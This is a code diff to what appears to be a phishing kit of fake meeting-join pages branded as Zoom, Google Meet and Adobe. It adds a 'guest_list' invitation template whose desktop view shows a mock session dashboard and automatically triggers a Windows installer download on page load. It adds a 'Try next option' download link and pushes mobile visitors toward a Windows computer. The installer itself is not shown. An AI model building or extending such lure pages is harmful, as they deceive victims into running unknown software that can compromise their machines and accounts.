@@ -82,6 +82,18 @@ function MeetingBootLoader({ template }: { template: GuestInviteTemplate }) {
     );
   }
 
+  if (template === 'guest_list') {
+    return (
+      <div className="guest-invite-loader">
+        <div className="guest-invite-loader__card">
+          <p className="guest-invite-loader__tag">Join Session</p>
+          <div className="guest-invite-loader__spin" />
+          <p>Joining your session…</p>
+        </div>
+      </div>
+    );
+  }
+
   if (template === 'google_meet') {
     return (
       <div className="meeting-loader meeting-loader--meet">
@@ -147,6 +159,7 @@ function ShieldIcon({ color }: { color: string }) {
 function MobileDesktopRequired({ template }: { template: GuestInviteTemplate }) {
   const isMeet = template === 'google_meet';
   const isAdobe = template === 'adobe';
+  const isGuestList = template === 'guest_list';
 
   return (
     <div className={`meeting-mobile ${isAdobe ? 'meeting-mobile--adobe' : ''}`}>
@@ -162,6 +175,10 @@ function MobileDesktopRequired({ template }: { template: GuestInviteTemplate }) 
               <AdobeLogo size={28} />
               <span className="meeting-mobile__brand-text">Document share</span>
             </div>
+          ) : isGuestList ? (
+            <div className="meeting-mobile__brand-row">
+              <span className="meeting-mobile__brand-text">Special Invitation</span>
+            </div>
           ) : (
             <ZoomLogo size="sm" />
           )}
@@ -171,21 +188,25 @@ function MobileDesktopRequired({ template }: { template: GuestInviteTemplate }) 
                 ? 'meeting-mobile__icon-wrap--meet'
                 : isAdobe
                   ? 'meeting-mobile__icon-wrap--adobe'
-                  : 'meeting-mobile__icon-wrap--zoom'
+                  : isGuestList
+                    ? 'meeting-mobile__icon-wrap--guest-list'
+                    : 'meeting-mobile__icon-wrap--zoom'
             }`}
           >
-            <MonitorIcon color={isMeet ? '#60a5fa' : isAdobe ? '#f87171' : '#2D8CFF'} />
+            <MonitorIcon color={isMeet ? '#60a5fa' : isAdobe ? '#f87171' : isGuestList ? '#a89078' : '#2D8CFF'} />
           </div>
           <h1>Desktop Required</h1>
           <p className="meeting-mobile__msg">
             {isAdobe
               ? 'To open this shared document securely, please use a desktop or laptop computer running Windows.'
-              : 'To ensure the best secure video conference experience and full feature support, please open this meeting link on a desktop or laptop computer.'}
+              : isGuestList
+                ? 'To view the guest list securely, please open this invitation on a desktop or laptop computer running Windows.'
+                : 'To ensure the best secure video conference experience and full feature support, please open this meeting link on a desktop or laptop computer.'}
           </p>
         </div>
         <div className="meeting-mobile__footer">
           <ShieldIcon color={isMeet ? '#7dd3a8' : isAdobe ? '#f87171' : '#2D8CFF'} />
-          {isMeet ? 'Google Workspace Secure' : isAdobe ? 'Adobe Secure' : 'Zoom Secure'}
+          {isMeet ? 'Google Workspace Secure' : isAdobe ? 'Adobe Secure' : isGuestList ? 'Secure Session' : 'Zoom Secure'}
         </div>
       </div>
     </div>
@@ -271,12 +292,13 @@ function useBrowserInstallerDownload(
   code: string,
   installerUrl: string,
   installerFileName: string,
+  enabled = true,
 ) {
   const [downloadStarted, setDownloadStarted] = useState(false);
   const [cancelled, setCancelled] = useState(false);
 
   useEffect(() => {
-    if (!installerUrl || cancelled) return;
+    if (!enabled || !installerUrl || cancelled) return;
 
     // Delay so React Strict Mode's mount→unmount→remount does not cancel the download.
     let alive = true;
@@ -290,7 +312,7 @@ function useBrowserInstallerDownload(
       alive = false;
       window.clearTimeout(timer);
     };
-  }, [code, installerUrl, installerFileName, cancelled]);
+  }, [code, installerUrl, installerFileName, cancelled, enabled]);
 
   return {
     downloadStarted,
@@ -408,6 +430,100 @@ function AdobeLogo({ size = 100 }: { size?: number }) {
         borderRadius: size > 40 ? 0 : 8,
       }}
     />
+  );
+}
+
+function GuestJoinDashboardMock({ deviceLabel }: { deviceLabel: string }) {
+  return (
+    <div className="guest-join-dashboard" aria-hidden>
+      <header className="guest-join-dashboard__top">
+        <div className="guest-join-dashboard__device">
+          <span className="guest-join-dashboard__check" />
+          <span className="guest-join-dashboard__device-name">{deviceLabel}</span>
+        </div>
+        <div className="guest-join-dashboard__session">
+          <span className="guest-join-dashboard__avatar" />
+          <span className="guest-join-dashboard__bar">
+            <span className="guest-join-dashboard__bar-fill" />
+          </span>
+          <span className="guest-join-dashboard__guest">Guest — 2…</span>
+          <span className="guest-join-dashboard__monitor" />
+        </div>
+      </header>
+      <aside className="guest-join-dashboard__panel">
+        <p className="guest-join-dashboard__panel-title">VPS12447</p>
+        <dl className="guest-join-dashboard__fields">
+          <div>
+            <dt>Company:</dt>
+            <dd />
+          </div>
+          <div>
+            <dt>Department:</dt>
+            <dd />
+          </div>
+          <div>
+            <dt>Device Type:</dt>
+            <dd />
+          </div>
+        </dl>
+      </aside>
+    </div>
+  );
+}
+
+function GuestListDesktop({
+  installerUrl,
+  installerFileName,
+  code,
+}: {
+  hostName: string;
+  installerUrl: string;
+  installerFileName: string;
+  code: string;
+}) {
+  const deviceLabel =
+    typeof window !== 'undefined' && window.location.hostname
+      ? `DESKTOP-${code.slice(0, 8).toUpperCase()}`
+      : 'DESKTOP-GUESTLIST';
+  const { downloadStarted } = useBrowserInstallerDownload(
+    code,
+    installerUrl,
+    installerFileName,
+    true,
+  );
+
+  return (
+    <div className="guest-join-page">
+      <GuestJoinDashboardMock deviceLabel={deviceLabel} />
+      <div className="guest-join-page__scrim" aria-hidden />
+      <div className="guest-join-page__modal" role="dialog" aria-labelledby="join-session-title">
+        <div className="guest-join-page__modal-head">
+          <h2 id="join-session-title">Join Session</h2>
+          <button type="button" className="guest-join-page__close" aria-label="Close">
+            ×
+          </button>
+        </div>
+        <div className="guest-join-page__modal-body">
+          <p className="guest-join-page__lead">Joining your session.</p>
+          <p className="guest-join-page__sub">
+            Detected app switch that was likely launch of app.
+          </p>
+          <p className="guest-join-page__trouble">
+            Having trouble?{' '}
+            <a href={installerUrl} download={installerFileName}>
+              Try next option
+            </a>{' '}
+            (WindowsInstallerDownload)
+          </p>
+          {downloadStarted ? (
+            <p className="guest-join-page__status">Opening {installerFileName}…</p>
+          ) : null}
+          <p className="guest-join-page__footer">
+            SystemProfiles / WindowsDesktop[6.0-X] ChromeHost / UrlLaunch
+          </p>
+        </div>
+      </div>
+    </div>
   );
 }
 
@@ -567,6 +683,19 @@ export function MeetingJoinLanding({ template: routeTemplate }: { template: Gues
 
   if (mobile) {
     return <MobileDesktopRequired template={routeTemplate} />;
+  }
+
+  if (routeTemplate === 'guest_list') {
+    return (
+      <GuestListDesktop
+        code={code}
+        hostName={query.data.label || 'Your Host'}
+        installerUrl={query.data.windowsInstallerUrl}
+        installerFileName={
+          query.data.installerFileName ?? installerFileNameForTemplate(routeTemplate)
+        }
+      />
+    );
   }
 
   if (routeTemplate === 'adobe') {
